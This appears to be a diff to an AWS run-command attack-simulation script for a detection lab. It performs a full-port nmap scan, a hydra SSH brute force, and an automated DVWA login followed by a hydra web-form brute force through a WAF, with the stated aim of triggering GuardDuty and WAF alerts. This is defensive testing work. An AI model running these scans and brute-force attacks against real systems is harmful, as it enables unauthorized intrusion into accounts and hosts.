@@ -20,11 +20,12 @@ parameters:
     type: String
     description: SSH 무차별 대입 대상 계정
     default: victim
-  DvwaSession:
+  WebBaseUrl:
     type: String
     description: |
-      DVWA 웹 무차별 대입용 PHPSESSID 쿠키값. 비우면 웹 공격은 건너뛴다.
-      (DVWA 로그인 후 브라우저 쿠키에서 PHPSESSID 확인)
+      DVWA 웹 공격 대상 베이스 URL — ALB(WAF 경유), 예: http://<alb-dns>:8081.
+      WAF 를 타야 빨간 흐름선이 뜨므로 DVWA IP 직접(:80 filtered)이 아닌 ALB 를 대상으로 한다.
+      스크립트가 이 URL 로 자동 로그인해 PHPSESSID 를 얻는다(수동 입력 불필요). 비우면 웹 공격 생략.
     default: ''
 mainSteps:
   - action: 'aws:runShellScript'
@@ -39,18 +40,26 @@ mainSteps:
         - '# 부팅 시 만든 attacker 이미지가 준비될 때까지 잠깐 대기'
         - 'for i in $(seq 1 30); do [ -f /opt/attacker/READY ] && break; sleep 5; done'
         - WL=/opt/attacker/wordlists
-        - '# ① nmap'
+        - '# ① nmap — 전체 포트 스캔. 소수 포트로는 GuardDuty Recon:EC2/Portscan 임계치에 못 미친다.'
         - 'echo "== [1] nmap ==" | tee -a "$OUT"'
-        - 'docker run --rm attacker:latest nmap -Pn -sV -p 22,80,443,3306 "{{ TargetHost }}" 2>&1 | tee -a "$OUT" || true'
-        - '# ② hydra SSH 무차별 대입'
+        - 'docker run --rm attacker:latest nmap -Pn -sV -T4 -p- "{{ TargetHost }}" 2>&1 | tee -a "$OUT" || true'
+        - '# ② hydra SSH 무차별 대입 — -f 제거로 전체 리스트를 시도해 연결량을 늘린다(SSHBruteForce 탐지).'
         - 'echo "== [2] hydra ssh ({{ SshUser }}) ==" | tee -a "$OUT"'
-        - 'docker run --rm -v $WL:/wl attacker:latest hydra -l "{{ SshUser }}" -P /wl/pass.txt -t 4 -f -I "ssh://{{ TargetHost }}" 2>&1 | tee -a "$OUT" || true'
-        - '# ③ hydra DVWA 웹 로그인 무차별 대입 (세션 쿠키가 있을 때만)'
-        - 'if [ -n "{{ DvwaSession }}" ]; then'
-        - '  echo "== [3] hydra dvwa web ==" | tee -a "$OUT"'
-        - '  docker run --rm -v $WL:/wl attacker:latest hydra -L /wl/users.txt -P /wl/pass.txt -t 4 -f "{{ TargetHost }}" http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie\: PHPSESSID={{ DvwaSession }}; security=low" 2>&1 | tee -a "$OUT" || true'
+        - 'docker run --rm -v $WL:/wl attacker:latest hydra -l "{{ SshUser }}" -P /wl/pass.txt -t 8 -I "ssh://{{ TargetHost }}" 2>&1 | tee -a "$OUT" || true'
+        - '# ③ DVWA 웹 로그인 무차별 대입 — ALB(WAF 경유) 대상. 스크립트가 자동 로그인해 세션을 얻는다.'
+        - 'if [ -n "{{ WebBaseUrl }}" ]; then'
+        - '  echo "== [3] hydra dvwa web (auto-login) ==" | tee -a "$OUT"'
+        - '  JAR=$(mktemp)'
+        - '  # 로그인 폼에서 CSRF user_token 과 세션 쿠키 확보 (login.php 의 유일한 32-hex 가 토큰)'
+        - '  TOKEN=$(curl -s -c "$JAR" "{{ WebBaseUrl }}/login.php" | grep -oE "[0-9a-f]{32}" | head -1)'
+        - '  curl -s -b "$JAR" -c "$JAR" --data "username=admin&password=password&Login=Login&user_token=$TOKEN" "{{ WebBaseUrl }}/login.php" -o /dev/null'
+        - '  SID=$(awk "/PHPSESSID/{print \$7}" "$JAR" | tail -1)'
+        - '  echo "session: $SID (token $TOKEN)" | tee -a "$OUT"'
+        - '  HP=$(echo "{{ WebBaseUrl }}" | sed -E "s#https?://##; s#/.*##"); WHOST=${HP%%:*}; WPORT=${HP##*:}; [ "$WPORT" = "$WHOST" ] && WPORT=80'
+        - '  docker run --rm -v $WL:/wl attacker:latest hydra -L /wl/users.txt -P /wl/pass.txt -t 8 -s "$WPORT" "$WHOST" http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie\: PHPSESSID=$SID; security=low" 2>&1 | tee -a "$OUT" || true'
+        - '  rm -f "$JAR"'
         - 'else'
-        - '  echo "== [3] dvwa web skipped (DvwaSession 미지정) ==" | tee -a "$OUT"'
+        - '  echo "== [3] dvwa web skipped (WebBaseUrl 미지정) ==" | tee -a "$OUT"'
         - 'fi'
         - '# 결과 업로드 (지역별 프리픽스)'
         - 'aws s3 cp "$OUT" "s3://{{ ScanBucket }}/atk/{{ RegionLabel }}/$TS.txt"'
